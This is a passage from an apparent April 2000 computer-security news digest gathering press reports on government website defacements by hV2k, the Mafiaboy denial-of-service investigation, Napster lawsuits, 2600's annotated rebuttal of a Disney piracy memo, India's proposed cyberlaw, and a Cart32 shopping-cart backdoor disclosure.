     this time. Someone calling themselves HV2k defaced the web server of
     the US DHHS last Friday evening with a message "HV2k won't die". HV2K
     is credited with defacing the same server on 11/2/99.

      Cyber-mischief shows potential for damaging future attacks Online 
      terrorists, criminals likely to target vital infrastructure systems David 
      Pugliese The Ottawa Citizen

      His alias is hV2k and he's a hacker who specializes in breaking into 
      military and government computers. 

      HV2k is the Internet name of the person who entered the Department of 
      National Defence's Web page on Nov. 1. Within a period of five days, hV2k 
      -- also known as "slipy" -- broke into 19 military and government 
      computers in Canada and the United States. On his list were the state of 
      Virginia's Sex Offender Registry, the state of New York's tax computer 
      system, the Canadian government's Human Resources Development Department, 
      and four U.S. military computer sites. 

      A joint Canadian Forces National Investigation Service and RCMP 
      investigation determined the identity of two people involved in the hV2k 
      attacks, one of them being a young offender, but no further details are 
      being released. 

      But one thing is certain: The Canadian military expects hackers similar to 
      hV2k to come calling again. 

      "Canada is becoming more and more of a target for hacker-cracker groups as 
      information regarding domestic vulnerabilities becomes known," a Canadian 
      military intelligence report written in November concludes. Expect more 
      intrusions, was the report's basic message. 

      HV2k simply left his name on the military's Web site, but that action 
      required the department to individually check all its pages on the 
      Internet to see whether they had been altered. It's not known what was 
      done to the U.S. sites. 

      But security analysts and government officials are concerned there is 
      potential for much more than Web vandalism, especially when compu-ters are 
      put into the hands of terrorists and criminals. A concentrated attack, 
      they worry, could shut down the key infrastructure computers that run 
      everything from the hydro system to telecommunications. 

      The result could be similar to the damage caused by the massive ice storm 
      that paralysed much of Eastern Canada in 1998. 

      "To me, it's the threat of the future which has to be watched more 
      closely," says Conservative Senator William Kelly, the chairman of the 
      Senate committee on terrorism and public safety. "A cyber-attack is a much 
      cheaper way to interfere with critical infrastructures than it is to drop 
      a nuclear bomb." 

      The other problem Canada faces is its close links with the U.S., both in 
      economic areas and its computer infrastructure. Any attack on the U.S. is 
      bound to cause a ripple effect into Canada. 

      "The U.S. has the highest level of technology, and therefore is the most 
      vulnerable to (information operations) attack by state (or) non-state 
      actors," warns another intelligence report compiled in November. "Canada's 
      connectivity with the U.S. also makes it highly vulnerable to (information 
      operations) attacks." 

      But terrorism expert John Thompson of the Mackenzie Institute in Toronto 
      sees the threat as overblown, at least for now. He says those who are 
      "attacking" government and military systems have been mainly hackers not 
      related to terrorist groups. 

      "No one has seen a terrorist yet who can do anything beyond hacking a Web 
      page up," Mr. Thompson points out. "It's more of a threat in potential 
      than one that has been realized." 

      The main problem for terrorist groups, he argues, is in finding competent 
      hackers. "Where is (Osama) bin Laden going to get his hackers?" asks Mr. 
      Thompson, referring to the alleged terrorist leader who is believed to 
      have ordered bombing attacks against U.S. embassies in Africa. "In 
      Afghanistan? I don't think so." 

      Mr. Kelly acknowledges that many attacks on Canadian computer systems can 
      be classified as more a nuisance than a threat. But he also points out 
      that some of the attacks, while appearing to be minor in nature, are 
      actually probes to test the weaknesses of the systems. That could be a 
      lead-up to more devastating assaults in the future. 

      In other cases, information has been removed or altered. For example, 
      Immigration Canada's computers have been hacked into by someone opera-ting 
      from Asia and certain records were removed. "I consider that highly 
      dangerous," says Mr. Kelly. 

      Specialists in information warfare vary in their estimation of how 
      prepared Canada is for a cyber-attack. Col. Randy Alward, commander of the 
      Canadian Forces Information Operations Group, said the military itself has 
      a secure internal computer system. It also has a specialized team that 
      continually tests the security of its systems. 

      The Armed Forces is also developing a robust information protection 
      capability because it wants to branch out more on the Internet, using it 
      for everything from gathering information on military equipment purchases 
      to booking travel for employees. But to do that it has to make sure that 
      any future Internet connections are secure, so intruders can't use them to 
      slip into the internal computer system. 

      "We believe we are developing an information protection capability that is 
      fairly good," said Col. Alward. "We're quite comfortable with it, but it 
      is developing." 

      Other specialists, such as Prakash Bhartia, director general of Defence 
      Research Establishment Ottawa, where advanced work is being conducted into 
      hacker threats, worry that other federal government and commercial 
      computers are open to attack. "We are pretty vulnerable," acknowledges Mr. 
      Bhartia. So far, he said, Canada has escaped any real dama-ging attack. 

      His concern is borne out by intelligence reports. "The vulnerabilities of 
      Canadian critical infrastructure are increasing and recent trends show 
      more attacks aimed at infrastructures," the November report warns. 

      But Mr. Kelly believes the country is on the right track in preparing for 
      future cyber attacks. He says a lot of progress has been made in both 
      provincial and federal government areas in setting up a system to share 
      information on attacks and determining where the vulnerabilities lie. He 
      believes Canada is ahead of the U.S. in the area of protecting its 
      infrastructure computers and that a national centre to co-ordinate a 
      response to cyber attacks will soon be developed by the government. 

      "One of the problems we've had all along is the relative lack of concern 
      Canadians have always had about their own security," said Mr. Kelly. "But 
      I think people are gradually becoming more aware of what the risks are." 

      Those risks, according to the Canadian military intelligence reports, 
      could come in the form of hackers for hire, both for criminal and 
      terrorist groups. "Many hackers or crackers, including former employees of 
      Eastern Bloc intelligence services, now work on the open market and 
      provide their services to state/non-state actors," one report determined. 
      "Clients include business intelligence firms engaged in industrial 
      espionage as well as criminal organizations intent on outwitting police 
      surveillance or perpetrating electronic frauds." 

      It points out that the Colombian drug cartel, for instance, has set up a 
      communications system that is difficult for police and western 
      intelligence agencies to break into. 

      Other groups are operating for more political motives. One such 
      organization, the Hong Kong Blondes, claims to be based in China and is 
      directed by two individuals by the names of Blondie Wong and Lemon LI. An 
      offshoot of that group has been created and dubbed the Yellow Pages. It 
      has threatened to attack the information infrastructure systems in China 
      and the U.S., with the goal of increasing international awareness of human 
      rights abuses in China. 

      "It seems (the Hong Kong Blondes) was created to demand accountability 
      from western companies that conduct business with (Chinese) organizations 
      who are responsible for the continuing abuses of human rights," one 
      intelligence report noted. The Hong Kong Blondes, it pointed out, are 
      ready to conduct computer attacks on western companies dealing with China.

      Italy: Software Piracy OK, Sorta Reuters 8:00 a.m. Apr. 21, 2000 PDT 

      
      MILAN -- A judge in Turin has ruled that it is not a crime to copy 
      software as long as it is not done for profit and the pirated copies are 
      not sold to third parties, Italian newspapers reported on Friday. 

      Corriere della Sera and other papers reported the case of a Turin 
      businessman who made copies of word-processing, accounting, and design 
      software for use in his company. 

      But even though he saved money by paying only one license fee, the judge 
      ruled that since he had not sold on the copied software to others, he did 
      not act "for profit." 

      
      Defense lawyer Claudio Morro told Corriere that the ruling was in line 
      with the law, which specifically said that for criminal rather than civil 
      charges to be brought, the motive for copying the software had to be 
      profit. 

      "My client copied the programs not to sell them to others but only to use 
      them within his company. So in his case there is only the saving on 
      spending," Morro was quoted as saying. 

      "There could still be elements for a civil case, but from a criminal point 
      of view the question is resolved." 

      A Microsoft Italia executive told the paper the company was disgusted by 
      the ruling. 

      "It is clearly the fault of a legislative hole, but also of an excessively 
      technical attitude on the part of the judge who passed the sentence. The 
      judge has made a mistake," Maurizio Bendina, director of Microsoft 
      Italia's small business division, was quoted as saying.

101.0 [HNN] Navy Intranet National Security Risk?

     contributed by William Knowles 
     The American Federation of Government Employees (AFGE) has charged
     that the Navy's proposed $10 billion, 360,000 seat intranet is threat
     to national security. AFGE says that the Navy has not thoroughly
     thought out its plan and that awarding the entire contract to one
     company places a considerable security risk on the proposed Intranet.
     The Navy claims that the AFGE simply does not understand the
     complexity of the situation.

      Navy Intranet a Security Threat? by Craig Bicknell 3:00 a.m. Apr. 21, 2000 
      PDT The U.S. Navy's plan to build the world's biggest Intranet could 
      create a big security threat and a boondoggle to boot, according to the 
      country's largest federal employees union. 

      "We're concerned about national security, because the Navy's not able to 
      answer basic questions about how they will protect national security on 
      (the new Intranet), and we're concerned that they're playing a shell game 
      with money," said Brendan Danaher, policy analyst for the 600,000 
      member-plus American Federation of Government Employees (AFGE). 


      The union's barrage is the latest attack on the Navy's proposal to build a 
      gargantuan, 360,000-seat Intranet that would unify all of the Navy and 
      Marine Corp's shore-based operations. The Navy plans to award the $10 
      billion contract for the project to one of four corporate bidders this 
      June -- nine months earlier than originally planned -- reflecting the 
      sea-service's urgency to reap the benefits of modern info-tech. 

      Last month, the United States General Accounting Office testified before 
      Congress that the Navy had rushed the proposal to corporate bidders 
      without properly analyzing how it would be funded and managed, and what 
      effect it would have on military and civilian information technology 
      workers. 

      Since then, embattled Navy representatives have appeared before Congress 
      53 times to defend their plan. 

      "There's been absolutely no one who questions the need, value, or concept 
      of this Intranet," Navy deputy CIO Ron Turner said. "They just don't 
      understand the math we've put into this." 

      But there's more than a math problem, insists AFGE's Danaher. The Navy's 
      plan to contract out the installation, service, and oversight of the 
      Intranet to a single private company poses an unacceptable national 
      security risk, he said. 

      "We're concerned that private companies will put their interest before 
      national security," Danaher said. "What if that company's ownership 
      changes, or its stock price plummets. Who knows what could happen?" 

      That argument lacks a certain sophistication, according to Turner. 

      "It's a comment made without looking at how we currently operate. The 
      government would like you to believe that we control the networks, but we 
      ride on commercial fiber that someone else operates," he said. 

      Moreover, the Navy currently operates 100-plus separate networks, all with 
      different firewalls and security, all of which have to interconnect. That 
      means 100 points of vulnerability, according to Turner. With a unified 
      Intranet, the Navy can deploy one security system and screw it down tight. 
      Security will be improved, not degraded, he insists.       There's no 
      budget problem either, Turner said. Funds for the Intranet will come from 
      money already allocated for IT projects, not from the operational coffers 
      that pay for ships to sail and planes to fly, as critics in Congress have 
      charged. 

      Turner attributes the AFGE's attack largely to a self-serving desire to 
      protect union IT jobs that might be threatened by the new Intranet. Some 
      1,000 civilian IT employees could be displaced by the Intranet, he said, 
      but the Navy will take pains to place them in new positions. 

      Danaher counters that it's not the threat of job losses that concerns the 
      AFGE so much as the Navy's inability to say exactly what jobs might be 
      lost where, and what that says about the broader project. "We don't know, 
      the Navy doesn't know, nobody knows, and that's a symptom of a larger 
      problem," Danaher said. 

      "Our members are people that work for the military and the federal 
      government, and they're concerned about national security and efficiency," 
      he said. "When you look at the history, you see that the Navy is anything 
      but trustworthy when it comes to contract oversight. We're not saying this 
      is a horrible idea, but the way they're going about this is pretty 
      dangerous." 

      The government's accounting office and a number of congressmen share those 
      concerns. 

      "Look, we're not trying to pull the wool over people's eyes," said a weary 
      Turner, who expects to appear before Congress several times in the coming 
      weeks to further detail the Navy's proposal. 

      Meanwhile, barring any direct orders to the contrary, the project will 
      continue full-speed ahead. 

      "Nobody's told us to stop or slow down," Turner said.

           A HOLIDAY MESSAGE FROM DISNEY CHIEF 04/23/00 

      2600 was recently furnished with a copy of an email sent from Walt Disney 
      CEO, Michael Eisner, to a vast number of Disney employees. While 2600 is 
      not mentioned by name, the letter clearly focuses on the issues raised by 
      the lawsuit Disney (and other MPAA members) have filed against us for 
      publishing DeCSS on our website. In one paragraph towards the end of the 
      letter Eisner actually makes our case for us and admits that either DVDs 
      are too expensive and people pirate them, or they are affordable (which 
      they are) and people don't pirate them (which they don't). 

      Our comments are in bold. 

      Dear Fellow Cast Members: 

      In several past e-mails, I have written you about the tremendous 
      opportunities represented by the Internet. Today, I offer a caveat. While 
      the Internet continues to be present great potential to our company, we 
      first must fully address the issue of piracy. 

      For some reason piracy has been on my mind. Maybe this is because I keep 
      reading about the seriousness of it, or maybe it is because I know a 
      digital copy of a film is a perfect copy. Or maybe it is because I know 
      that the Internet is a worldwide delivery system honoring no borders. Or 
      maybe it is because I just needed something to speak about at the 
      Variety/Schroeder's entertainment industry conference in New York City 10 
      days ago. Probably it is a little of all the above. 

      [A digital copy transferred over the Internet is likely to be compressed 
      and far poorer quality than an analog copy.] 

      By "piracy," I'm not talking about the comical characters sailing the high 
      seas at the Pirates of the Caribbean. Rather, I'm talking about an 
      underground of secretive and sequestered pirates of encryption - the 
      hackers who shamelessly assert that anything they can get their hands on 
      is legally theirs. These Internet pirates try to hide behind some 
      contrived New Age arguments of the Internet, but all they are really doing 
      is trying to make a case for Age Old thievery. 

      [Wow that's pretty twisted. "pirates of encryption", who the hell are 
      they? How does one pirate encryption? More so, what does that possibly 
      have to do with people stealing? On top of all that, now 'hackers' is 
      supposed to be synonymous with 'shameless thieving pirates of encryption'? 
      Someone here is shameless, and it ain't us. "When they hack a DVD and then 
      distribute it on the web", yet another jump is made from breaking 
      encryption to PLAY DVDs to distributing it on the web. Funny how they 
      haven't accused ANYONE of doing this. Nor would it make any sense for 
      someone to "hack a DVD" before ripping it as a VCD - since VCDs are 
      usually lower resolution than television.] 

      When they hack a DVD and then distribute it on the web, it is no different 
      than if someone puts a quarter in a newspaper machine and then takes out 
      all the papers, which, of course, would be illegal and morally wrong. The 
      pirates will argue that this analogy is unfair, maintaining that all 
      they're doing is cracking a digital code. But, by that standard, it would 
      be justifiable to crack a bank code and transfer the funds from someone 
      else's account into your own. There's just no way around it - theft is 
      theft, whether it is enabled by a handgun or a computer keyboard. 

      [Of course pirates will argue that analogy is unfair - so would anyone 
      with any modicum of critical thinking skills. While we could argue the 
      difference between intellectual property and tangibles like a newspaper, 
      this analogy is irrelevant because no piracy is actually taking place. 
      Normally we wouldn't even feel the need to respond to this, but since he 
      goes on to imply that WE are the "pirates" it seems like a good idea. 
      Eisner speculates that people will maintain that all that was done was the 
      "breaking of the digital code" - he's right. Note that breaking CSS does 
      not involve any stealing or piracy. So then it does not logically follow 
      that by breaking the code someone is also necessarily using it to steal. 
      After all, CSS prevents DVDs from being PLAYED not COPIED, so cracking it 
      is in no way an indication of impending theft.] 

      Of course, piracy has been around a long time. Many of you probably 
      remember a very funny "Seinfeld" episode (I suppose that's redundant - 
      they all were funny, except maybe for the last one) in which Jerry becomes 
      an "auteur" at making illegal copies of movies by videotaping them off the 
      screen at the local multiplex. But, piracy is anything but funny ... 
      especially now that, instead of making one bad quality videotape for sale 
      on the street, these digital pirates could soon be making unlimited 
      numbers of high quality copies available on the Internet. 

      One of the fallacies of the piracy debate is that it's really just a 
      conflict of the pro-technology members of the "New Media" against the 
      anti-technology members of the "Old Media." This characterization couldn't 
      be more wrong. At Disney we embrace technology. And we always have. 
      Throughout his career, Walt Disney recognized new technology as the friend 
      of the storyteller. And, at Disney today, we are not only seizing the 
      tremendous possibilities offered by technology in movies, as with 
      "Dinosaur" and "Toy Story," but we are also active participants in the 
      expansion of the Internet with our GO.com family of sites. We intend to 
      continue to devote resources to the Internet ... but not if this requires 
      surrendering the rights to things we own. With this in mind, our company 
      is undertaking a wide-ranging strategy to make the Internet truly safe for 
      intellectual property. This strategy consists of five main elements. 

      First of all, we are turning to our representatives in Washington. 
      Intellectual property rights are really no different from ordinary 
      property rights. If you own something, you expect the government to 
      respect your right to keep it from being stolen. 

      [Ah good, since legislating security away worked so well the first time!] 

      Secondly, we are working with governments around the world to respect our 
      rights. We are actively involved in the Global Business Dialogue on 
      Electronic Commerce, and our company is serving as chair of the 
      Intellectual Property Work Group. 

      The third element is education. Working with The Motion Picture 
      Association of America, we are advocating a more aggressive campaign to 
      make people aware of intellectual property rights on the Internet. Most 
      people are honest and want to do the right thing. But they can't do the 
      right thing if they don't know that they're doing a wrong thing. 

      [Perhaps they should consider gaining a tighter grasp on reality 
      themselves, before being so presumptuous as to educate others on the 
      Internet.] 

      Fourth, we believe that the entertainment industry as a whole should take 
      meaningful technological measures. Working in cooperation with technology 
      companies, we need to develop innovative and flexible encryption devices 
      that can stay one step ahead of the hackers. 

      [How about just doing it right the first time? Or better yet, stop 
      infringing on the Fair Use Doctrine, so that people won't NEED to break 
      the encryption!] 

      Our fifth initiative is economic. History has shown that one of the best 
      deterrents to pirated product is providing legitimate product at 
      appropriate prices. In the music industry, we have already seen that 
      people will gladly pay fair prices for legally-produced product even when 
      it can be easily reproduced and unlawful copies can be easily acquired. 

      [This is the best paragraph in the whole damn thing. Michael Eisner is 
      actually admitting that either DVD prices are too high (like in the UK) or 
      that piracy is not a problem because people will buy DVDs anyway - just 
      like they do CDs. He is absolutely correct, we have been saying this all 
      along. It is cheaper to BUY a DVD than it is to pirate it, and you get a 
      nice clean copy complete with goodies. Finally, the truth comes out: 
      PIRACY IS NOT THE ISSUE! Being able to PLAY legally purchased DVDs in the 
      player and country of your choice are the issues! We're so glad Michael 
      Eisner has finally admitted this - maybe now Disney will drop the 
      lawsuit.] 

      With every passing day, I believe we are getting closer to a time when the 
      Internet will become another important revenue stream for the studios. 
      This is what happened with Pay TV in the '70s and with Home Video in the 
      '80s. If we act appropriately and aggressively in combating the pirates, 
      then this could be the dawn of a new era of opportunity for companies that 
      consistently create great entertainment ... and there's one in particular 
      that comes to mind. 

      So that's what has been on my mind the last couple of weeks, that as well 
      as the strong showing of our company, especially at our parks and TV 
      networks. Life is good. Have a nice Easter/Passover Weekend.

      Hacker's friends may be suspects, too       By Kevin Johnson, USA TODAY 

      WASHINGTON - Authorities investigating the February attacks on some of the 
      most popular Internet sites are focusing on three close friends of the 
      15-year-old Canadian boy who was charged earlier this week, a senior U.S. 
      law enforcement official said Thursday.

      The three friends of the Montreal computer hacker known as "Mafiaboy" are 
      among several potential suspects identified by authorities in the 
      cyberassaults that temporarily shut down the Web sites of CNN, Yahoo!, 
      Amazon.com and several other media and commercial giants.

      Beyond Montreal, authorities are examining the activities of a small group 
      of hackers thought to be based in Israel. Officials there say the group 
      has been involved in various online financial crimes, some involving 
      stolen credit card numbers.

      The group is believed to be part of a larger circle of computer users, 
      including Mafiaboy, who have spent time in an Internet chat room called 
      TNT. The chat room is accessible only by password.

      Investigators also are trying to determine whether Dennis Moran, a 
      17-year-old New Hampshire hacker known online as "Coolio," was involved in 
      the attacks in February.

      Moran, who authorities say has boasted of being involved in the attacks, 
      was charged last month in an attack on a Web site run by the Los Angeles 
      Police Department.

      The unidentified Montreal teenager known as Mafiaboy has been charged only 
      in two attacks against CNN.com, which was shut down for 3 1/2 hours Feb. 8 
      after it was overloaded with requests.

      Mafiaboy claimed credit in chat rooms for similar assaults on sites run by 
      Yahoo! and Buy.com. Officials believe Mafiaboy may have been capable of 
      directing all the assaults but doubt that he did.

      Analysts familiar with the assaults say the software used to wall off 
      access to the CNN Web site on Feb. 8 was different and less sophisticated 
      than that used to paralyze Yahoo! on Feb. 7. 

      Michael Lyle, who runs a software security firm in Palo Alto, Calif., said 
      the attack on CNN involved software commonly found on Internet sites for 
      hackers.

      "I literally could show you how to do it in three or four hours," he said.

      The goal is to flood Internet sites with tens of thousands of requests, 
      disguising the source of the assault by routing the requests through 
      high-capacity computers elsewhere. The tactic overloads the targeted Web 
      sites, causing electronic paralysis.

      Investigators say Mafiaboy orchestrated the attack on CNN.com through 
      computers at the University of California-Santa Barbara.

      A Canadian law enforcement official said that because of Mafiaboy's age, 
      it is unlikely he would be sent to an adult prison if convicted of 
      "mischief to data." 

      If prosecuted and convicted as an adult, the teenager could face up to 20 
      years in prison. But in Canada's juvenile system, he faces a maximum of 
      two years in a youth detention center if convicted.

      IU installs filters preventing use of MP3 music site

      April 20, 2000

      BLOOMINGTON, Ind. -- Indiana University announced today that it will block 
      all IU network traffic related to a popular MP3 music Web site called 
      Napster.com.

      "In the rapidly evolving technology related to the Internet, copyright 
      issues in cyberspace remain unclear," said Christopher Simpson, IU vice 
      president for public affairs and government relations. "We believe Indiana 
      University has no liability by allowing access to sites such as Napster. 
      We now believe, however, that our faculty, staff and students could incur 
      legal exposure if they use this technology. Until those unresolved legal 
      issues are clarified, it seems prudent to block the site."

      Heavy metal band Metallica, E/M Ventures and Creeping Death Music filed a 
      lawsuit last week against Napster, IU and two other colleges contending 
      copyright infringement. While IU does not believe it has any liability to 
      the plaintiffs, the lawsuit prompted a closer look at access issues.

      "This issue has received a significant amount of attention in recent 
      days," Simpson said. "It has caused us to focus on the fact that 
      technology has leaped well ahead of clear legal issues. University policy 
      prohibits violation of copyright laws, and we believe strongly in 
      protecting intellectual property. Those are fundamental tenets that we 
      will not abandon."

      Simpson said he hopes a long-term solution can be found to ensure 
      individuals can have access to digital music while protecting intellectual 
      property rights.

      ISP AboveNet hit by a denial-of-service attack -- blocking customers' Web

      By Robert Lemos, ZDNet News       UPDATED April 26, 2000 8:18 AM PT 

      Top-five Internet service provider AboveNet Communications suffered a 
      denial-of-service attack on Tuesday -- raising the specter of another 
      round of Web attacks.       Paul Vixie, senior vice president of Internet 
      services for Metromedia Fiber Network Inc., AboveNet's parent company, 
      said the attack did not resemble February's spate of DoS attacks. 

      
      "This was not just a SMURF attack or some other broadcast storm aiming 
      meaningless data at our routers," Vixie said. "It was a direct attack on 
      our infrastructure." 

      The attack stopped Internet traffic to AboveNet's customers for several 
      hours starting late Tuesday morning. 

      The White Plains, N.Y., company is working with the FBI to investigate the 
      attack and declined to give more-specific details. Vixie did say that 
      tracking the attacker should not be as difficult as February's DoS attacks 
      had been. "Technically, there is cause for hope, where in the (denial of 
      service) case their was no cause for hope," he said. 

      Last week, a 15-year-old Canadian boy who called himself "Mafiaboy" online 
      was arrested by the Royal Canadian Mounted Police and charged in 
      connection with the denial-of-service attack on CNN's online site in 
      February. 

      The teen, whose name was not released due to his age, was arrested April 
      15 and formally charged two days later with two counts of mischief to data 
      after police searched his home. No suspects have been named in the attacks 
      on at least seven other sites, however. 

      AboveNet attack more skilled       This attacker seemed a bit more skilled 
      than the cybervandals who flooded eight major Web sites in February, Vixie 
      said. "I would bet that this was someone with a little more experience 
      than the last batch." 

      AboveNet provides Internet service of and hosts the Web sites of nearly 
      1,000 companies, with offices in the United Kingdom, Germany, the 
      Netherlands and Japan.

     Cyber-Regulations Appellate Tribunal.

      India Eyes Cyberlaws by Frederick Noronha 3:00 a.m. Apr. 25, 2000 PDT 

      
      BANGALORE, India - With estimates that nearly 2 million Indian citizens 
      will be online by 2001, the world's second-most populous country is 
      looking at ways to regulate cyberspace. 

      India is proposing a federal information technology bill to be voted on 
      next month. One of India's premier law schools, based here, has plans to 
      set up a national institute for cyber-legal studies and research. 

      The institute plans to research the problem of shifting business and trade 
      to the cyber-media, and blending national and international standards. It 
      is looking to sell the project to top Indian info-tech firms like Infosys 
      and Wipro through collaboration with policy planners in the Indian 
      government. 

      "We have made our blueprint, and plan to shortly approach friends in the 
      info-tech sector," said Dr. Nripen L. Mitra, director of the National Law 
      School of India University. 

      Bangalore, known as India's Silicon Valley, is a booming center for 
      software and dot-com companies. By the late 1990s, the city's software 
      exports comprised nearly 57 percent of India's total exports. The city has 
      an estimated 230 info-tech companies, employing nearly 25,000 
      professionals. 

      Mitra said rapid growth is in need of swift responses. 

      "Law behaves like a traditional Hindu wife, staying seven steps behind the 
      husband," he said. 

      The new high-tech economy also means Indian businessmen have to shift to 
      the paperless world after adapting to doing business in a very 
      bureaucratic country. 

      "Until recently, there were no cyberlaws in India," said Na Vijayashankar, 
      the author of a new book that explains the new laws that may take shape to 
      control, regulate, and harness cyberspace for Indian e-commerce. 

      The federal government recently brought forward the Information Technology 
      Bill. Under the proposed law, which is expected to be tabled in New 
      Delhi's Parliament in May, India will have a Cyber-Regulations Advisory 
      Committee, a controller, and adjudicating officers to regulate cyberlaws. 
      There will also be a Cyber-Regulations Appellate Tribunal. 

      The proposed law defines what constitutes a cybercrime, and also has 
      provisions to punish cyber-criminals. It sets up a framework for 
      transactions involving computer-generated documents and communication.       
      It also deems electronic documents as legally binding and acceptable in 
      place of paper. Checks and bills, powers of attorney, trusts, wills, and 
      contracts of sale of immovable property, however, will not be accepted in 
      a digital format. 

      Computer crimes recognized under the proposed law would affect hackers, 
      and those who are not authorized to enter a system to download data, 
      introduce viruses, damage data or the system, block access to authorized 
      users, or even assist another person in contravening the law. 

      Publishing electronic information that is considered obscene, tampering 
      with computer source documents, breaching confidentiality, publishing 
      false digital certificates, and failing to furnish information or tax 
      returns also would be a violation of the law. 

      If passed, the law would apply to anyone in or outside of India who 
      tampers with a computer located in India. 

      Contrary to other Indian laws, such as the Code of Criminal Procedure of 
      1973, additional powers have been given to the police to tackle 
      cybercrime. Any senior police officer can enter and search any public 
      place on suspicion without a warrant. 

      Those guilty of securing access to the system without authorization could 
      be fined up to 1 million rupees. Payment of damages would be made to the 
      person affected. 

      There are critics, of course. 

      Some say the software sector has flourished in India precisely because of 
      a lack of regulation. So while the framework for accepting electronic 
      documents is welcome, businessmen say the government should stay out of 
      trying to regulate much of the rest. 

      Senior Indian government officials, however, point to some shocking cases, 
      arguing that there's a need to regulate the cyberjungle. 

      They cite cases where a popular Hindi film actress was depicted nude on 
      the Internet using altered graphics. They also point to prominent cases of 
      cybersquatting, where some small firms allegedly tried to snatch the trade 
      names of huge newspapers. 

      "We had no remedies in such cases. Night and day, hackers are taking on 
      portals, too," said Gulshan Rai, the Ministry of Information Technology's 
      senior director. 

      Some Indian sites have also been the victims of hacking,­ especially after 
      last year's federally-sanctioned nuclear tests in Rajasthan, near the 
      Indo-Pakistan border. 

      Rai said the IT bill would take care of issues of "authentication, 
      origination, jurisdiction and attribution." In some cases of criminalized 
      cyber-behavior, the liability would be civil. But repeated and more severe 
      cases would be treated as criminal liability, Rai said. 

      E-commerce transactions are leading to ludicrous situations in taxation, 
      said India's IT task force member Montek S. Ahluwalia. Music sold 
      internationally on cassette tapes is being taxed, but the same music sold 
      in digital format is not; services sold over the Net internationally are 
      not taxed, while those sold within the country are, Ahluwalia said. 

      Rai said the cyber-surveillance and interceptions provisions of the new IT 
      bill would require those offering over 2MB of bandwidth to give access to 
      traffic to agencies like the Intelligence Bureau and Central Bureau of 
      Investigation. 

      There are other laws already in place relating to cybercrimes. 

      "Just because you're on the Internet doesn't put you above national laws. 
      Pornography and gambling is prohibited under the Indian Penal Code of 
      1860, advertisement regulations apply, and you can get hauled up for 
      defamation, libel or slander," said Annapurna Ogoti, of the law firm 
      Nishit Desai Associates.

      Rap artist sues Napster, students By John Borland Staff Writer, CNET 
      News.com April 25, 2000, 5:00 p.m. PT Rap artist Dr. Dre sued MP3-swapping 
      firm Napster today, adding a new layer of legal woes to the already 
      besieged company. 

      But this time, the stakes are being raised: Dr. Dre also is targeting 
      students at universities who are using the Napster software to download 
      MP3 files, putting individual music listeners into the legal line of fire. 

      It's the second lawsuit filed by musicians who say the controversial 
      software is responsible for massive violations of their copyrights. Heavy 
      metal band Metallica also is seeking to close Napster's digital doors. 

      Dr. Dre demanded last week that Napster remove his work from its service. 
      But the company refused, saying it could only remove individual users 
      identified as copyright violators. 

      In response, the artist is asking that the court shut down Napster and 
      award damages of $100,000 per illegally copied work. That could amount to 
      close to $10 million, according to the lawsuit. 

      "Napster devised and distributes software whose sole purpose is to permit 
      (the company) to profit by abetting and encouraging the pirating of the 
      creative efforts of the world's most admired and successful musical 
      artists," the suit reads. 

      The young company, started last year by 19-year-old student Shawn Fanning, 
      has thrown the music industry into a kind of panic. Fanning's software 
      allows people to link their computers directly to each other to share 
      their music collections without paying companies or artists for the songs. 
      At any time, thousands of people are online, sharing hundreds of thousands 
      of songs through Napster's directory. 

      
      The Recording Industry Association of America (RIAA) was the first to take 
      legal action, suing Napster late last year. Metallica joined this month 
      but set its legal sights on three universities it said were responsible 
      for their students' illegal use of the software. 

      But Dr. Dre, whose real name is Andre Young, also trains the specter of 
      legal responsibility directly on the students themselves. 

      No individual students or universities were named in the version of Dr. 
      Dre's suit filed today. Instead, it is serving as a kind of placeholder, 
      noting that five schools and students will be named later. 

      That could serve as an effective scare tactic, based on events of the past 
      week. Already the three universities named in Metallica's lawsuits have 
      blocked or sharply restricted use of Napster on their campuses. The threat 
      of any other school or student being added to this new lawsuit could push 
      other universities in the same direction and dissuade students from using 
      the service. 

      Dr. Dre himself released a terse explanation for his legal action. "I 
      don't like people stealing my music," he said in a press release today. 

      In a coincidence of the courts, Dr. Dre himself was sued for copyright 
      infringement last week. George Lucas' LucasFilm contends that the artist 
      used the trademarked THX sound, which appears before many movies, to open 
      his most recent album, even after being denied permission. 

      Dr. Dre's suit was filed in a Los Angeles federal court.

      go hunt the real pirates, like buy a clue. - Ed )

      Carnegie Mellon establishes anti-hacking institute 

      April 26, 2000       Web posted at: 5:16 p.m. EDT (2116 GMT)

      By Richard Stenger       CNN Interactive Writer

      PITTSBURGH, Pennsylvania (CNN) -- A Pennsylvania university created a 
      research institute this month dedicated to fighting computer attacks like 
      those that besieged major Web sites like eBay, Yahoo! and CNN.com in 
      February. 

      Unlike other computer network security R&D centers, the Carnegie Mellon 
      Institute for Survivable Systems will solicit private as well as federal 
      funds and concentrate on prevention rather than response, according to 
      CMISS officers. 

      The new research group, which will seek partnerships and fee-for-service 
      arrangements with the public and private sectors, will draw resources and 
      personnel from other Carnegie University facilities, in particular from 
      the CERT Coordination Center. 

       
      But unlike the CERT center, CMISS will not have restrictive limits on 
      corporate money. The CERT center receives most of its money from U.S. 
      agencies like the Department of Defense, the FBI and the IRS. 

      And the federal government sets strict limits for private investment in 
      the center, said Bill Pollack, a spokesman for CMU's Software Engineering 
      Institute, the parent department of CERT and CMISS. 

      "There's a limit on growth because of that. CMISS enables the Carnegie 
      Mellon community to get all kinds of funding," Pollack said. 

      CMISS hopes eventually to have an annual operating budget of $40 million, 
      in large part funded by the private sector, he said. 

      E-commerce businesses could be receptive to CMISS' research, considering 
      sporadic attacks from an average teenager can cost them billions of 
      dollars. 

      "There hasn't been a good foundation of data available to help researchers 
      understand the key factors that contribute to actual losses," said CMU 
      Computer Science Dean James Morris, in a statement. 

      The CERT center was created after the Morris Worm incident crippled about 
      10 percent of all computers on the Internet in 1988. Since then dozens of 
      computer emergency response teams have sprung up, but they tend to focus 
      on hacking breaches after the fact, according to CMISS. The new institute 
      will try to solve network security problems before they have a broad 
      impact. 

      "Information assurance, as it's practiced today, is not a science. It 
      remains largely ad hoc," said CMU Engineering Dean John Anderson, in a 
      statement. 

      CMISS has already earned praise from Sen. Rick Santorum of Pennsylvania. 

      "Carnegie Mellon's ... effort will, for the first time, establish a 
      public-private partnership that will help safeguard our national 
      security," Santorum said in a statement. He chairs the U.S. Senate's task 
      force on cybersecurity.

     contributed by root66 
     Cerberus Information Security has found a secret password that allows
     someone connecting to a web site running "Cart32" shopping cart
     software to gain access to the server. The backdoor could reveal such
     data as credit card numbers, order information, and shipping
     addresses. McMurtrey-Whitaker which sells cart32 said that they will
     have a patch available next week. @Stake L0pht labs has issued its own

